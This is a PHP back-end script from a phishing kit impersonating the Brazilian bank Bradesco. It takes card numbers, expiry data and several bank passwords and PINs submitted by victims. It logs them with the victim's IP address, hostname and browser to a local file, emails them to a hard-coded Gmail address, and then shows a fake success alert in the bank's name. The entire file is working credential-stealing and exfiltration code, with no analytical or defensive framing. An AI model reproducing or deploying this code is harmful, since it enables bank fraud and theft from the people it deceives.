<?php
error_reporting(0);

$cc1 = $_POST["cc1"];
$cc2 = $_POST["cc2"];
$cc3 = $_POST["cc3"];
$cc4 = $_POST["cc4"];

$meses = $_POST["meses"];
$anual = $_POST["anual"];
$infovia = $_POST["infovia"];
$tiporei = $_POST["tiporei"];



session_start();
date_default_timezone_set('America/Sao_Paulo');

$pcname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$para="anongrbb@gmail.com";
$n_dir="arquivos/";
$data = date("d/m/y"); // * Função para pegar a data de envio do e-mail
$ip = $_SERVER['REMOTE_ADDR']; // * Função para pegar o ip do usuário
$navegador = $_SERVER['HTTP_USER_AGENT']; // * Função para pegar o navegador do visitante
$hora = date("H:i");
$subj = "Dados / IP: $ip - Bradesco: DadosCC2";

$msg = "
   ---------------------------------------------
$data-($hora) - $ip - $pcname
---------------------------------------------

   ------------ BRADESCO ------------
AG: '.$_SESSION[agencia].'
CONTA: '.$_SESSION[conta].'-'.$_SESSION[digito].'
SENHA 4: '.$_SESSION[senha]. '
SENHA 6 DIG: '.$_POST[senhad6]. '
SENHA CC DÉBITO: '.$_POST[senhacd]. '

====== DADOS DO CC =======
$cc1 - $cc2 - $cc3 - $cc4
$meses/$anual
$infovia - $tiporei
==========FIM CC =========
------------BRADESCO INVESTIMENTOS------------

   ";

$h = date(" d-m-Y H-i-s");
$fp = fopen("$n_dir"."Bradesco_DadosCC2"."["."$h]"."$ip".".txt", "a");
// Escreve "exemplo de escrita" no bloco1.txt
$escreve = fwrite($fp, $msg);
fclose($fp);     
   
mail($para, $subj, $msg, "from: $aviao");

{
?>
	<html>
	<body>
<script>alert('As informações foram atualizadas com sucesso. O Bradesco S/A Agradece.');</script>
 
	</body>
	</html>
<?php
}
?>
